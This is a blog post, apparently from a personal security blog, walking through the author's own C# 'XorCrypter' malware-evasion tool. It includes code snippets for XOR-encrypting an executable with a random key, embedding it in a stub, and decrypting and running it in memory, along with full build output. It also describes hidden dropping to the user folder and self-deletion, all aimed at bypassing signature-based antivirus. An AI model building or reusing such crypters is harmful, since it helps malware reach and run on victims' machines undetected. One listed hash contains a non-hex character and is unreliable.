---
title: My first XorCrypter
date: 2025-12-17 00:00:00 +0000
categories: [Malware Development]
tags: [malware, crypter, xor, csharp, evasion]
---

This has been developed to assist my first malware development project to further more enhance the evasion capabilities.

This tool encrypts executables using XOR encryption with a randomly generated 32-byte key, then embeds them into a stub loader.
```
// 32-byte XOR key generation
byte[] xorKey = new byte[32];
using (RandomNumberGenerator rng = RandomNumberGenerator.Create())
{
    rng.GetBytes(xorKey);
}

// XOR encryption
byte[] encrypted = new byte[data.Length];
for (int i = 0; i < data.Length; i++)
{
    encrypted[i] = (byte)(data[i] ^ key[i % key.Length]);
}
```

The encrypted payload is decrypted and executed in memory upon runtime, bypassing basic static signature detection.
```
// Locate and extract encrypted payload
byte[] marker = { 0xDE, 0xAD, 0xBE, 0xEF };
int markerIndex = FindMarker(allData, marker);
int payloadStart = markerIndex + marker.Length;
byte[] encryptedPayload = new byte[payloadLength];

// Decrypt and execute
byte[] decryptedPayload = XORDecrypt(encryptedPayload, XOR_KEY);
ExecutePayloadInMemory(decryptedPayload);

```

### Running the crypter
1. **Crypter packs encrypted malware**: `infected.exe` gets encrypted and stuffed inside the loader
2. **Loader unpacks during execution**: When the crypter's output runs, it decrypts the malware
3. **Saves with random name**: Uses GUID filename (like `14221560-423a-4ca8-80ca-a78a4faa50cd`) 
4. **Located in user folder**: Drops to `C:\Users\[username]` as a hidden file
```
C:\Users\user\Desktop>XORCrypterBuilder.exe "infected.exe" "encrypt_infected.exe"
=== XOR CRYPTER STARTED ===
Current directory: C:\Users\user\Desktop
Working directory: C:\Users\user\Desktop
Input: C:\Users\user\Desktop\infected.exe
Output: C:\Users\user\Desktop\encrypt_infected.exe
Step 1: Reading payload...
Payload size: 145434735 bytes
Step 2: Generating XOR key...
XOR key: 3CAB5479EC0CF016...
Step 3: Encrypting payload...
Encrypted size: 145434735 bytes
Step 4: Creating stub...
Creating working stub executable...
[DEBUG] Creating temp directory: C:\Users\user\AppData\Local\Temp\013c7b62-108c-47bb-aedd-fc10256b5719
[DEBUG] Stub code written to: C:\Users\user\AppData\Local\Temp\013c7b62-108c-47bb-aedd-fc10256b5719\Program.cs
[DEBUG] Project file written to: C:\Users\user\AppData\Local\Temp\013c7b62-108c-47bb-aedd-fc10256b5719\SimpleStub.csproj[DEBUG] App manifest written to: C:\Users\user\AppData\Local\Temp\013c7b62-108c-47bb-aedd-fc10256b5719\app.manifest
[DEBUG] Testing dotnet availability...
[DEBUG] Dotnet version: 10.0.101
[DEBUG] Starting compilation...
[DEBUG] Command: dotnet publish -c Release -r win-x64 --self-contained true -o "C:\Users\user\AppData\Local\Temp\013c7b62-108c-47bb-aedd-fc10256b5719\publish"
[DEBUG] Compilation exit code: 0
[DEBUG] Compilation output:   Determining projects to restore...
  Restored C:\Users\user\AppData\Local\Temp\013c7b62-108c-47bb-aedd-fc10256b5719\SimpleStub.csproj (in 16.97 sec).
C:\Users\user\AppData\Local\Temp\013c7b62-108c-47bb-aedd-fc10256b5719\Program.cs(33,37): warning CS8602: Dereference of a possibly null reference. [C:\Users\user\AppData\Local\Temp\013c7b62-108c-47bb-aedd-fc10256b5719\SimpleStub.csproj]
  SimpleStub -> C:\Users\user\AppData\Local\Temp\013c7b62-108c-47bb-aedd-fc10256b5719\bin\Release\net9.0\win-x64\SimpleStub.dll
  SimpleStub -> C:\Users\user\AppData\Local\Temp\013c7b62-108c-47bb-aedd-fc10256b5719\publish\
[DEBUG] Looking for compiled stub at: C:\Users\user\AppData\Local\Temp\013c7b62-108c-47bb-aedd-fc10256b5719\publish\SimpleStub.exe
[DEBUG] Stub compiled successfully
[DEBUG] Compiled stub size: 70923552 bytes
[DEBUG] Copying stub to output: C:\Users\user\Desktop\encrypt_infected.exe
[DEBUG] Stub size: 70923552 bytes
[DEBUG] Appending marker and encrypted payload...
[DEBUG] Final output file size: 216358291 bytes
[DEBUG] Expected marker position: 70923552
[DEBUG] Final output file size: 216358291 bytes
[DEBUG] Cleaning up temp directory: C:\Users\user\AppData\Local\Temp\013c7b62-108c-47bb-aedd-fc10256b5719
SUCCESS: Encryption completed!
Output file: C:\Users\user\Desktop\encrypt_infected.exe
File size: 216358291 bytes
Original hash: 3510648fcc7011f822130a64e8b783869bdg2c802bd825dba7c19caaa8904a15
Encrypted hash: 2ee8e4188d224144af66d46d241808fe580f5690f6c281c8cbdd36b5d84caefc
Press any key to exit...
```

When running the encrypted .exe we generate a debug log to check the exection
![Pasted image](/assets/img/xorcrypter/Pasted image 20251217133230.png)

- The decrypted, working malware payload
- Executed by the crypter to deliver its function
- Should delete itself after running (auto-cleanup)
![Pasted image](/assets/img/xorcrypter/Pasted image 20251217133553.png)

This method effectively bypasses signature-based detection by encrypting the payload and compiling a unique loader for each use. However, behavior-based detection systems may still identify it by monitoring patterns like file writes and new process execution.


